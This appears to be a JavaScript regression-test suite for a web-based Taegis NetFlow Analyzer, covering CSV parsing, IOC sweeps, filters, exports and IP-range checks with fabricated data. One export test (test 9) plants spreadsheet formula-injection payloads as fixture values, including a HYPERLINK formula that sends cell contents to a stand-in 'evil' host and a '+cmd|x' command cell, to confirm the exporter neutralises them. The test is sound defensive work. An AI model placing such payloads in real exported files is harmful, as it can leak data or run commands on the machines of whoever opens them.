/* Regression tests for Taegis NetFlow Analyzer. They run INSIDE the analyzer page (tests/run.html
   loads a build in an iframe and evaluates this file in it), drive the real functions and DOM,
   and use only fabricated data built below plus sample/taegis-sample-synthetic.csv.
   Each test maps to a bug fixed in v0.6.3 — see tests/README.md. */
window.__runTests = async function(){
  const out=[]; const sleep=ms=>new Promise(r=>setTimeout(r,ms));
  const alerts=[]; window.alert=m=>alerts.push(String(m));   // failed loads alert(); don't block the run
  const q=s=>document.querySelector(s), qa=s=>[...document.querySelectorAll(s)];
  const cell=v=>/[",\n]/.test(v)?'"'+String(v).replace(/"/g,'""')+'"':String(v);
  const H=['type','event_time_usec','action','flow_action','action_result','source_address','source_port','destination_address','destination_port','source_nat_address','protocol','tx_byte_count','rx_byte_count','application_name','mfa_result','mfa_used','event_name','sensor_type','sensor_id','dest_ipgeo_summary','user_name','domain_name','additional_destination_addresses','additional_domain_names','source_domain_name','target_domain_name','dns_name','auth_error_code_description','additional_source_addresses'];
  const mk=rows=>[H.join(','),...rows.map(o=>H.map(h=>cell(o[h]??'')).join(','))].join('\n')+'\n';
  const nf=o=>({type:'netflow',event_time_usec:'2026-03-15T14:00:00Z',flow_action:'FW_ALLOWED',source_address:'10.20.5.11',source_port:'51544',destination_address:'140.82.113.20',destination_port:'443',protocol:'6',tx_byte_count:'100',rx_byte_count:'200',sensor_type:'FORTIGATE_FW',sensor_id:'FW-EDGE-01',...o});
  const au=o=>({type:'auth',event_time_usec:'2026-03-15T14:05:00Z',action:'LOGON',source_address:'203.0.113.9',user_name:'a@x.test',...o});
  const load=rows=>ingest(mk(rows));
  const count=sel=>parseInt(q(sel).textContent.replace(/,/g,''),10)||0;
  // every test starts from clean filters and no IOC list, so one test cannot leak state into the next
  const clean=()=>{ IOCS=null; q('#ioc-input').value=''; ['#nf-q','#rs-q','#au-q','#tl-q','#g-from','#g-to'].forEach(s=>q(s).value='');
    ['#nf-action','#au-res','#tl-type','#rs-dir'].forEach(s=>q(s).value=''); q('#g-public').checked=false; };
  const test=async(id,name,fn)=>{ clean(); try{ const r=await fn(); out.push({id,pass:!!r.pass,name,detail:r.detail}); }catch(e){ out.push({id,pass:false,name,detail:'threw: '+e.message}); } };

  await test('sample','synthetic sample loads with the expected counts',async()=>{
    ingest(await (await fetch('/sample/taegis-sample-synthetic.csv')).text());
    const c={events:REC.length,netflow:REC.filter(r=>r.cat==='netflow').length,auth:REC.filter(r=>r.cat==='auth').length,resetRows:qa('#rs-table tbody tr').length,nfRows:qa('#nf-table tbody tr').length};
    return {pass:c.events===41&&c.netflow===33&&c.auth===8&&c.resetRows===10&&c.nfRows===33,detail:JSON.stringify(c)};
  });

  await test('csv-1','parser: text after a closing quote stays in the same field and row',()=>{
    const got=JSON.stringify(parseCSV('a,b,c\n"abc"def,2,3\n4,5,6\n'));
    return {pass:got==='[["a","b","c"],["abcdef","2","3"],["4","5","6"]]',detail:got};
  });

  await test('csv-2','parser: skipping columns leaves the kept columns identical',async()=>{
    const text=await (await fetch('/sample/taegis-sample-synthetic.csv')).text();
    const full=parseCSV(text), keep=full[0].map((_,i)=>i%3!==1), part=parseCSV(text,()=>keep);
    let bad=0; for(let r=0;r<full.length;r++){ if(part[r].length!==full[r].length) bad++; for(let c=0;c<full[r].length;c++){ if(part[r][c]!==((r===0||keep[c])?full[r][c]:'')) bad++; } }
    return {pass:bad===0&&full.length===42,detail:`${full.length} rows, ${bad} mismatching cells`};
  });

  await test('1','IOC comment words are not treated as indicators',()=>{
    load([nf({domain_name:'www.example.com',destination_address:'8.8.8.8'}),nf({destination_address:'45.84.59.21'})]);
    q('#ioc-input').value='# seen in dot com phishing campaign\n45.84.59.21   # inline note about evil.org\n'; runSweep();
    const hits=REC.filter(r=>r.__ioc).map(r=>r.__ioc);
    return {pass:IOCS.doms.size===0&&hits.length===1&&hits[0]==='45.84.59.21',detail:`domain indicators: [${[...IOCS.doms].join(', ')}]; hits: [${hits.join(', ')}]`};
  });

  await test('2','Netflow export has the same rows as the on-screen table',()=>{
    const geo=JSON.stringify({asn:{autonomous_system_no:1,autonomous_system_org:'Example Net'},city:{name:'Frankfurt'},country:{iso_code:'DE'}});
    load([nf({destination_port:'3389'}),nf({destination_port:'3389',dest_ipgeo_summary:geo}),nf({destination_port:'443'})]);
    q('#nf-q').value='rdp'; drawNetflow(); const a=[count('#nf-count'),currentRows('netflow').length];
    q('#nf-q').value='de / frankfurt'; drawNetflow(); const b=[count('#nf-count'),currentRows('netflow').length];
    return {pass:a[0]===2&&a[1]===2&&b[0]===1&&b[1]===1,detail:`filter "rdp": shown ${a[0]}, exported ${a[1]}; filter "de / frankfurt": shown ${b[0]}, exported ${b[1]}`};
  });

  await test('3','epoch timestamps in s / ms / us / ns all resolve to the same instant',()=>{
    const vals=['1794443378','1794443378000','1794443378000000','1794443378000000000','2026-11-12T00:29:38Z'];
    load(vals.map(t=>nf({event_time_usec:t})));
    const got=REC.map(r=>r.ts?r.ts.toISOString():'null');
    return {pass:got.every(g=>g==='2026-11-12T00:29:38.000Z'),detail:vals.map((v,i)=>`${v.length} chars -> ${got[i]}`).join('; ')};
  });

  await test('4','dropping an IOC file on the IOC tab loads IOCs and keeps the dataset',async()=>{
    load([nf({}),nf({}),nf({destination_address:'45.84.59.21'})]);
    q('nav button[data-v="ioc"]').click();
    const dt=new DataTransfer(); dt.items.add(new File(['45.84.59.21\nevil.example.com\n'],'iocs.txt',{type:'text/plain'}));
    q('#ioc-input').dispatchEvent(new DragEvent('drop',{bubbles:true,cancelable:true,dataTransfer:dt}));
    await sleep(700);
    const r={events:REC.length,iocBox:q('#ioc-input').value.trim().replace(/\n/g,' '),hits:REC.filter(x=>x.__ioc).length};
    q('nav button[data-v="netflow"]').click();
    return {pass:r.events===3&&r.iocBox.includes('45.84.59.21')&&r.hits===1,detail:JSON.stringify(r)};
  });

  await test('5a','loading a second file resets dropdowns and filters and re-runs the IOC sweep',()=>{
    load([nf({flow_action:'FW_RESET_CLIENT_TO_SERVER'}),nf({flow_action:'FW_ALLOWED',destination_address:'45.84.59.21'})]);
    q('#ioc-input').value='45.84.59.21'; runSweep();
    q('#nf-action').value='FW_RESET_CLIENT_TO_SERVER'; q('#nf-q').value='10.20'; drawNetflow();
    load([nf({flow_action:'FW_BLOCKED',destination_address:'45.84.59.21'}),nf({flow_action:'FW_BLOCKED',destination_address:'45.84.59.21'}),nf({flow_action:'FW_UNKNOWN'})]);
    const r={actions:[...q('#nf-action').options].map(o=>o.value).filter(Boolean),flows:count('#nf-count'),textFilter:q('#nf-q').value,flagged:REC.filter(x=>x.__ioc).length,summary:q('#ioc-summary').textContent.slice(0,40)};
    return {pass:r.actions.join()==='FW_BLOCKED,FW_UNKNOWN'&&r.flows===3&&r.textFilter===''&&r.flagged===2&&/^2 matching/.test(r.summary),detail:JSON.stringify(r)};
  });

  await test('5b','a failed load keeps the previous dataset and its file name',async()=>{
    readFile(new File([mk([nf({}),nf({})])],'good.csv')); await sleep(500);
    readFile(new File([''],'empty.csv')); await sleep(500);
    const a={file:FILENAME,label:q('#fname').textContent,events:REC.length};
    readFile(new File(['just a note\nnot a csv\n'],'notes.txt')); await sleep(500);
    const b={file:FILENAME,events:REC.length};
    return {pass:a.file==='good.csv'&&a.label.includes('good.csv')&&a.events===2&&b.file==='good.csv'&&b.events===2,detail:`after empty.csv: ${JSON.stringify(a)}; after notes.txt: ${JSON.stringify(b)}`};
  });

  await test('6','failure values are not coloured as success (result and MFA tags)',()=>{
    load([au({action_result:'UNSUCCESSFUL',mfa_result:'MFA_NOT_USED'}),au({action_result:'INVALID_PASSWORD',mfa_result:'UNSUCCESSFUL'}),au({action_result:'SUCCESS',mfa_result:'SUCCESS'}),au({action_result:'FAILED',mfa_result:'FAILED'}),au({action_result:'PASSWORD_EXPIRED',mfa_used:'true'})]);
    drawAuth();
    const res={},mfa={};
    for(const tr of qa('#au-table tbody tr')){ const t=tr.children[5].querySelector('.tag'), m=tr.children[6].querySelector('.tag');
      if(t) res[t.textContent]=t.className.replace('tag','').trim(); if(m) mfa[m.textContent]=m.className.replace('tag','').trim(); }
    const nfOK=/tag ok/.test(resultTag({result:'',action:'FW_ALLOWED'}))&&/tag bad/.test(resultTag({result:'',action:'FW_BLOCKED'}));
    const pass=res.UNSUCCESSFUL==='bad'&&res.INVALID_PASSWORD==='bad'&&res.PASSWORD_EXPIRED==='bad'&&res.SUCCESS==='ok'&&res.FAILED==='bad'
      &&mfa.MFA_NOT_USED!=='ok'&&mfa.UNSUCCESSFUL==='bad'&&mfa.SUCCESS==='ok'&&mfa.FAILED==='bad'&&mfa.MFA_USED==='ok'&&nfOK;
    return {pass,detail:`result: ${JSON.stringify(res)}; mfa: ${JSON.stringify(mfa)}; FW_ALLOWED ok / FW_BLOCKED bad: ${nfOK}`};
  });

  await test('7','IOC sweep matches IPv6, NAT, additional-address and defanged indicators',()=>{
    load([nf({source_address:'2001:DB8::BAD'}),nf({source_nat_address:'45.84.59.21'}),nf({additional_destination_addresses:'["193.187.151.190","10.1.1.1"]'}),
      nf({domain_name:'cdn.evil.example.com'}),nf({additional_domain_names:'["login.bad.example.net"]'}),nf({})]);
    q('#ioc-input').value='2001:db8:0:0:0:0:0:bad\n45.84.59[.]21\n193.187.151.190\nhxxps://evil[.]example[.]com/gate.php\nbad.example.net\nattacker@gmail.com\nd41d8cd98f00b204e9800998ecf8427e\n'; runSweep();
    const flags=REC.map(r=>r.__ioc?1:0).join('');
    return {pass:flags==='111110',detail:`rows [v6 src, NAT, additional dst, domain via URL, additional domain, clean] flagged: ${flags}; parsed: ${q('#ioc-parsed').textContent}`};
  });

  await test('8','clicking an IP pivots to that exact address; partial text still matches as a substring',()=>{
    load([nf({source_address:'10.0.44.6'}),nf({source_address:'10.0.44.65'}),nf({source_address:'10.0.44.66'}),nf({source_address:'110.0.44.6'})]);
    qa('#nf-table td.ip').find(td=>td.textContent.trim()==='10.0.44.6').click();
    const r={netflow:count('#nf-count'),timeline:count('#tl-count'),exported:currentRows('netflow').length};
    q('#nf-q').value='10.0.44.'; drawNetflow(); r.partial=count('#nf-count');
    return {pass:r.netflow===1&&r.timeline===1&&r.exported===1&&r.partial===4,detail:JSON.stringify(r)};
  });

  await test('9','CSV export neutralises formula cells and quotes carriage returns',()=>{
    const evil='=HYPERLINK("http://evil/?"&A1,"click")';
    load([au({user_name:evil,domain_name:'@SUM(1+1)'}),au({user_name:'+cmd|x',domain_name:'-2+3'}),au({user_name:'plain',domain_name:'-'})]);
    let cap=''; const orig=window.download; window.download=(n,t)=>{cap=t;}; exportCSV('timeline'); window.download=orig;
    const cells=parseCSV(cap).slice(1).flat();
    const live=cells.filter(c=>/^[=+@]/.test(c)||(/^-/.test(c)&&c.length>1&&!/^-\d+(\.\d+)?$/.test(c)));
    const kept=cells.includes("'"+evil)&&cells.includes('-'), cr=csvCell('a\rb')==='"a\rb"';
    return {pass:live.length===0&&kept&&cr,detail:`cells a spreadsheet would run as formulas: ${JSON.stringify(live)}; original text kept after the apostrophe: ${kept}; CR quoted: ${cr}`};
  });

  await test('10a','a redraw reads the filter inputs a fixed number of times, not once per row',()=>{
    load(Array.from({length:2000},(_,i)=>nf({source_port:String(1024+i)})));
    const orig=document.querySelector; let n=0; document.querySelector=function(){ n++; return orig.apply(document,arguments); };
    try{ redrawAll(); } finally { delete document.querySelector; }
    return {pass:n<200,detail:`${n.toLocaleString()} DOM lookups for one redraw of 2,000 rows`};
  });

  await test('10b','typing in a text filter is debounced',async()=>{
    load(Array.from({length:500},(_,i)=>nf({source_port:String(1024+i)})));
    let renders=0; const mo=new MutationObserver(()=>renders++); mo.observe(q('#nf-table'),{childList:true});
    for(const v of ['1','10','10.','10.2','10.20']){ q('#nf-q').value=v; q('#nf-q').dispatchEvent(new Event('input',{bubbles:true})); await sleep(15); }
    await sleep(700); mo.disconnect();
    return {pass:renders===1&&count('#nf-count')===500,detail:`${renders} table render(s) for 5 keystrokes; final count ${count('#nf-count')}`};
  });

  await test('10c','raw CSV rows are not kept after loading',()=>{
    load(Array.from({length:50},()=>nf({})));
    const rawRows=(typeof RAW==='undefined')?0:RAW.length, perRec=REC.filter(r=>r.raw!==undefined).length;
    return {pass:rawRows===0&&perRec===0,detail:`rows held in RAW: ${rawRows}; records holding a raw row: ${perRec}`};
  });

  /* ---- v0.6.4: findings from the external review of v0.6.3 ---- */

  await test('11','IOC sweep checks every populated domain column, not only the first',()=>{
    load([nf({domain_name:'safe.example',target_domain_name:'evil.example'}),nf({domain_name:'safe.example',source_domain_name:'evil.example'}),
      nf({domain_name:'safe.example',dns_name:'evil.example'}),nf({domain_name:'evil.example'}),nf({domain_name:'safe.example',additional_domain_names:'["x.evil.example"]'}),nf({domain_name:'safe.example'})]);
    q('#ioc-input').value='evil.example'; runSweep();
    const flags=REC.map(r=>r.__ioc?1:0).join('');
    return {pass:flags==='111110',detail:`rows [target_domain, source_domain, dns_name, domain_name, additional, clean] flagged: ${flags}`};
  });

  await test('12','a CSV that ends inside a quoted field is rejected and the loaded dataset is kept',async()=>{
    readFile(new File([mk([nf({}),nf({})])],'good.csv')); await sleep(500);
    const tryLoad=async(name,text)=>{ const n=alerts.length; readFile(new File([text],name)); await sleep(500); return {file:FILENAME,events:REC.length,alerted:alerts.length>n}; };
    const a=await tryLoad('truncated.csv','type,event_time_usec,source_address\nnetflow,2026-11-12T01:00:00Z,"10.0.0.1\nnetflow,2026-11-12T01:00:01Z,10.0.0.2\n');
    const b=await tryLoad('truncated-skipped-column.csv','type,event_time_usec,original_data,source_address\nnetflow,2026-11-12T01:00:00Z,"{""a"":1,10.0.0.1\nnetflow,2026-11-12T01:00:01Z,x,10.0.0.2\n');
    const c=await tryLoad('multiline.csv','type,event_time_usec,application_name,source_address\nnetflow,2026-11-12T01:00:00Z,"line one\nline two",10.0.0.1\nnetflow,2026-11-12T01:00:01Z,x,10.0.0.2\n');
    const kept=x=>x.file==='good.csv'&&x.events===2&&x.alerted;
    return {pass:kept(a)&&kept(b)&&c.file==='multiline.csv'&&c.events===2&&!c.alerted&&REC[0].src==='10.0.0.1',
      detail:`truncated: ${JSON.stringify(a)}; truncated in a skipped column: ${JSON.stringify(b)}; valid embedded newline (control): ${JSON.stringify(c)}`};
  });

  await test('13','"full range" keeps events in the last fraction of a second',()=>{
    load([nf({event_time_usec:'2026-11-12T01:00:00.250Z'}),nf({event_time_usec:'2026-11-12T01:00:01.750Z'}),nf({event_time_usec:'2026-11-12T01:00:01.900Z'})]);
    q('#g-full').click(); const a={shown:count('#tl-count'),exported:currentRows('timeline').length,to:q('#g-to').value};
    load([nf({event_time_usec:'2026-11-12T01:00:01.750Z'})]);
    q('#g-full').click(); const b={shown:count('#tl-count')};
    return {pass:a.shown===3&&a.exported===3&&b.shown===1,detail:`3 events: ${JSON.stringify(a)}; single fractional-second event: ${JSON.stringify(b)}`};
  });

  await test('14','exports include the MFA result, failure detail and application the tables show',()=>{
    const want=['FAILED','INVALID_PASSWORD','MFA_NOT_USED','Exchange Online'];
    load([au({action_result:'FAILED',auth_error_code_description:'INVALID_PASSWORD',mfa_result:'MFA_NOT_USED',application_name:'Exchange Online'}),nf({application_name:'SSL_TLSv1.3'})]);
    const grab=view=>{ let cap=''; const orig=window.download; window.download=(n,t)=>{cap=t;}; exportCSV(view); window.download=orig; return parseCSV(cap); };
    const auth=grab('auth'), net=grab('netflow');
    const missing=want.filter(v=>{ const i=auth[1].indexOf(v); return i<0||!auth[0][i]; });
    const appOK=net[1].includes('SSL_TLSv1.3'), sameWidth=auth.every(r=>r.length===auth[0].length);
    return {pass:missing.length===0&&appOK&&sameWidth,detail:`missing from the auth export: ${JSON.stringify(missing)}; application in the netflow export: ${appOK}; header: ${auth[0].join(',')}`};
  });

  await test('15','"Public IP only" classifies IPv6 by address range and rejects malformed addresses',()=>{
    const src=['fe90::1','ff02::1','::ffff:10.0.0.1','not:an:ip','fe80::1','fd12::1','::1','::','2001:db8::1','2001:4860:4860::8888','::ffff:8.8.8.8'];
    load(src.map(s=>nf({source_address:s,destination_address:'fd00::2'})));
    q('#g-public').checked=true; redrawAll();
    const kept=currentRows('netflow').map(r=>r.src).sort();
    q('#g-public').checked=false; redrawAll();
    const direct={'febf::1':isPublicIP('febf::1'),'::ffff:127.0.0.1':isPublicIP('::ffff:127.0.0.1'),'2606:4700:4700::1111':isPublicIP('2606:4700:4700::1111'),'8.8.8.8':isPublicIP('8.8.8.8'),'10.1.1.1':isPublicIP('10.1.1.1')};
    const pass=kept.join()===['2001:4860:4860::8888','::ffff:8.8.8.8'].join()&&!direct['febf::1']&&!direct['::ffff:127.0.0.1']&&direct['2606:4700:4700::1111']&&direct['8.8.8.8']&&!direct['10.1.1.1'];
    return {pass,detail:`kept by the public-only filter: [${kept.join(', ')}]; isPublicIP: ${JSON.stringify(direct)}`};
  });

  await test('16','IOC highlights refresh on every table after a sweep and after clearing the list',()=>{
    load([nf({destination_address:'8.8.8.8'}),nf({destination_address:'8.8.8.8',flow_action:'FW_RESET_CLIENT_TO_SERVER'}),au({source_address:'8.8.8.8'})]);
    const hl=()=>['#nf-table','#rs-table','#au-table','#tl-table'].map(s=>qa(s+' tbody tr.ioc').length).join(',');
    q('#ioc-input').value='8.8.8.8'; runSweep(); const a=hl();
    q('#ioc-input').value=''; runSweep(); const b=hl();
    return {pass:a==='2,1,1,3'&&b==='0,0,0,0',detail:`highlighted rows [netflow, reset, auth, timeline] after the sweep: ${a}; after clearing: ${b}`};
  });

  await test('17','a CSV without the required Taegis columns is rejected; a sparse export still loads',async()=>{
    readFile(new File([mk([nf({}),nf({})])],'good.csv')); await sleep(500);
    const tryLoad=async(name,text)=>{ const n=alerts.length; readFile(new File([text],name)); await sleep(500); return {file:FILENAME,events:REC.length,alerted:alerts.length>n}; };
    const a=await tryLoad('unrelated.csv','title,description\nhello,world\n');
    const b=await tryLoad('no-time-column.csv','type,source_address\nnetflow,10.0.0.1\n');
    const c=await tryLoad('header-only.csv',H.join(',')+'\n');
    const d=await tryLoad('sparse.csv','type,event_time_usec\nnetflow,2026-11-12T01:00:00Z\n');
    const kept=x=>x.file==='good.csv'&&x.events===2&&x.alerted;
    return {pass:kept(a)&&kept(b)&&kept(c)&&d.file==='sparse.csv'&&d.events===1&&!d.alerted,
      detail:`unrelated: ${JSON.stringify(a)}; no time column: ${JSON.stringify(b)}; header only: ${JSON.stringify(c)}; sparse but valid (control): ${JSON.stringify(d)}`};
  });

  await test('18','"Copy for case notes" copies the timeline as filtered and sorted on screen',async()=>{
    let cap=''; Object.defineProperty(navigator.clipboard,'writeText',{configurable:true,value:t=>{ cap=t; return Promise.resolve(); }});
    const r={};
    try{
      load([nf({event_time_usec:'2026-11-12T01:00:00Z',source_address:'10.0.0.1'}),nf({event_time_usec:'2026-11-12T01:00:01Z',source_address:'10.0.0.2'})]);
      copyNotes(); await sleep(30);
      r.tableFirst=q('#tl-table tbody tr td.ip').textContent.trim(); r.notesFirst=(cap.split('\n')[0].match(/10\.0\.0\.\d/)||[''])[0];
      q('#tl-q').value='10.0.0.2'; q('#tl-q').dispatchEvent(new Event('input',{bubbles:true})); copyNotes(); await sleep(30);
      r.linesRightAfterTyping=cap.split('\n').length;
      load(Array.from({length:501},(_,i)=>nf({event_time_usec:new Date(Date.UTC(2026,10,12,1,0,i)).toISOString()})));
      copyNotes(); await sleep(30); let lines=cap.split('\n');
      r.newestFirst={lines:lines.length,first:lines[0].slice(11,19),last:lines[499].slice(11,19)};
      qa('#tl-table th')[0].click(); copyNotes(); await sleep(30); lines=cap.split('\n');   // flip to oldest-first
      r.oldestFirst={first:lines[0].slice(11,19),last:lines[499].slice(11,19)};
      qa('#tl-table th')[0].click();                                                      // restore newest-first
    } finally { delete navigator.clipboard.writeText; }
    const pass=r.tableFirst==='10.0.0.2'&&r.notesFirst==='10.0.0.2'&&r.linesRightAfterTyping===1
      &&r.newestFirst.lines===500&&r.newestFirst.first==='01:08:20'&&r.newestFirst.last==='01:00:01'&&r.oldestFirst.first==='01:00:00'&&r.oldestFirst.last==='01:08:19';
    return {pass,detail:JSON.stringify(r)};
  });

  await test('19','IPv4 parsing is strict and the private ranges have the right boundaries (guard)',()=>{
    const parse={'1.2.3.4':16909060,'255.255.255.255':4294967295,'01.2.3.4':16909060,'1.2.3':null,'1.2.3.':null,'1..2.3':null,'256.1.1.1':null,'1.2.3.4.5':null,' 1.2.3.4':null,'0x1.2.3.4':null,'1e1.2.3.4':null,'0001.2.3.4':null,'':null,'a.b.c.d':null};
    const priv=['10.0.0.0','10.255.255.255','172.16.0.0','172.31.255.255','192.168.0.0','192.168.255.255','127.0.0.1','169.254.1.1','100.64.0.0','100.127.255.255','0.1.2.3','224.0.0.0','239.1.1.1','240.0.0.1','255.255.255.255','192.0.0.5','192.0.2.5','198.51.100.5','203.0.113.5','198.18.0.0','198.19.255.255'];
    const pub=['9.255.255.255','11.0.0.0','172.15.255.255','172.32.0.0','192.167.255.255','192.169.0.0','100.63.255.255','100.128.0.0','198.17.255.255','198.20.0.0','223.255.255.255','8.8.8.8','126.255.255.255','128.0.0.0'];
    const badParse=Object.keys(parse).filter(k=>ipToInt(k)!==parse[k]), badPriv=priv.filter(a=>isPublicIP(a)), badPub=pub.filter(a=>!isPublicIP(a));
    return {pass:!badParse.length&&!badPriv.length&&!badPub.length,detail:`wrong parses: ${JSON.stringify(badParse)}; private seen as public: ${JSON.stringify(badPriv)}; public seen as private: ${JSON.stringify(badPub)}`};
  });

  /* ---- v0.6.5: findings from the recheck of v0.6.4 ---- */

  await test('20','additional_* columns are decoded as JSON arrays before IOC matching',()=>{
    // '\\u002e' below puts the six characters . in the CSV cell: a valid JSON escape for "."
    load([nf({additional_domain_names:'["evil.example"]'}),nf({additional_domain_names:'["evil\\u002eexample"]'}),
      nf({additional_destination_addresses:'["45.84.59.21"]'}),nf({additional_destination_addresses:'["45\\u002e84.59.21"]'}),nf({additional_source_addresses:'["45\\u002e84.59.21"]'}),
      nf({additional_domain_names:'[["evil.example"],{"x":1},7]'}),            // nested array is flattened; object and number members are harmless
      nf({additional_domain_names:'["evil.example","x.example"'}),             // malformed (unterminated) array: falls back to the delimited reading
      nf({additional_domain_names:'other.example; evil.example'}),             // plain delimited list
      nf({additional_domain_names:'["safe.example"]',additional_destination_addresses:'["10.1.1.1"]'})]);
    q('#ioc-input').value='evil.example\n45.84.59.21'; runSweep();
    const flags=REC.map(r=>r.__ioc?1:0).join('');
    return {pass:flags==='111111110',detail:`rows [literal domain, escaped domain, literal dst, escaped dst, escaped src, nested, malformed array, delimited, clean] flagged: ${flags}`};
  });

  await test('21','a trailing DNS root dot on evidence domains does not prevent an IOC match',()=>{
    const rows=[nf({domain_name:'evil.example.'}),nf({domain_name:'evil.example'}),nf({domain_name:'not-evil.example'}),nf({domain_name:'cdn.evil.example.'}),
      nf({domain_name:'safe.example',target_domain_name:'evil.example.'}),nf({additional_domain_names:'["evil.example."]'})];
    load(rows); q('#ioc-input').value='evil.example.'; runSweep();
    const dotted=REC.map(r=>r.__ioc?1:0).join(''), shown=REC[0].__ioc, kept=REC[0].domain;
    load(rows); q('#ioc-input').value='EVIL.example'; runSweep();
    const undotted=REC.map(r=>r.__ioc?1:0).join('');
    return {pass:dotted==='110111'&&undotted==='110111'&&shown==='evil.example.'&&kept==='evil.example.',
      detail:`IOC "evil.example." flagged: ${dotted}; IOC "EVIL.example" flagged: ${undotted} (expected 110111; third row is the not-evil.example control); evidence shown as: ${shown}`};
  });

  await test('22','mfa_used=false is kept as MFA_NOT_USED, distinct from missing MFA data',()=>{
    load([au({user_name:'u1@x.test',mfa_used:'true'}),au({user_name:'u2@x.test',mfa_used:'false'}),au({user_name:'u3@x.test'}),
      au({user_name:'u4@x.test',mfa_result:'MFA_SUCCESS',mfa_used:'false'}),au({user_name:'u5@x.test',mfa_used:'FALSE'}),nf({user_name:'n1',mfa_used:'false'})]);
    const want={'u1@x.test':'MFA_USED','u2@x.test':'MFA_NOT_USED','u3@x.test':'','u4@x.test':'MFA_SUCCESS','u5@x.test':'MFA_NOT_USED','n1':''};
    const rec={}; for(const r of REC) rec[r.user]=r.mfa;
    drawAuth(); const dom={}; for(const tr of qa('#au-table tbody tr')) dom[tr.children[3].textContent.trim()]=tr.children[6].textContent.trim();
    let cap=''; const orig=window.download; window.download=(n,t)=>{cap=t;}; exportCSV('timeline'); window.download=orig;
    const csv=parseCSV(cap), iu=csv[0].indexOf('user'), im=csv[0].indexOf('mfa'), exp={}; for(const row of csv.slice(1)) exp[row[iu]]=row[im];
    const ok=o=>Object.keys(want).every(k=>(o[k]??'')===want[k]);
    return {pass:ok(rec)&&ok({...dom,n1:''})&&ok(exp),detail:`records: ${JSON.stringify(rec)}; auth table: ${JSON.stringify(dom)}; export: ${JSON.stringify(exp)}`};
  });

  await test('23','every text column a view displays can be found with that view\'s text filter',()=>{
    load([nf({destination_port:'3389',application_name:'MS.RDP',sensor_id:'FW-EDGE-02'}),nf({destination_port:'443',application_name:'SSL_TLSv1.3'}),
      au({action_result:'FAILED',mfa_result:'MFA_DENIED',application_name:'Exchange Online'}),au({action_result:'SUCCESS',mfa_result:'MFA_SUCCESS',application_name:'Teams'})]);
    const probe=(view,box,draw,cnt,text)=>{ q(box).value=text; draw(); const r=`${count(cnt)}/${currentRows(view).length}`; q(box).value=''; draw(); return r; };
    const r={
      'timeline "rdp"':probe('timeline','#tl-q',drawTimeline,'#tl-count','rdp'),'timeline "HTTP/S"':probe('timeline','#tl-q',drawTimeline,'#tl-count','HTTP/S'),
      'timeline "3389"':probe('timeline','#tl-q',drawTimeline,'#tl-count','3389'),'timeline "failed"':probe('timeline','#tl-q',drawTimeline,'#tl-count','failed'),
      'netflow "ms.rdp"':probe('netflow','#nf-q',drawNetflow,'#nf-count','ms.rdp'),'netflow "fw-edge-02"':probe('netflow','#nf-q',drawNetflow,'#nf-count','fw-edge-02'),
      'auth "mfa_denied"':probe('auth','#au-q',drawAuth,'#au-count','mfa_denied'),'auth "exchange"':probe('auth','#au-q',drawAuth,'#au-count','exchange'),
    };
    return {pass:Object.values(r).every(v=>v==='1/1'),detail:'shown/exported per search (each should be 1/1): '+JSON.stringify(r)};
  });

  clean();
  return {build:document.title,passed:out.filter(t=>t.pass).length,failed:out.filter(t=>!t.pass).length,results:out};
};
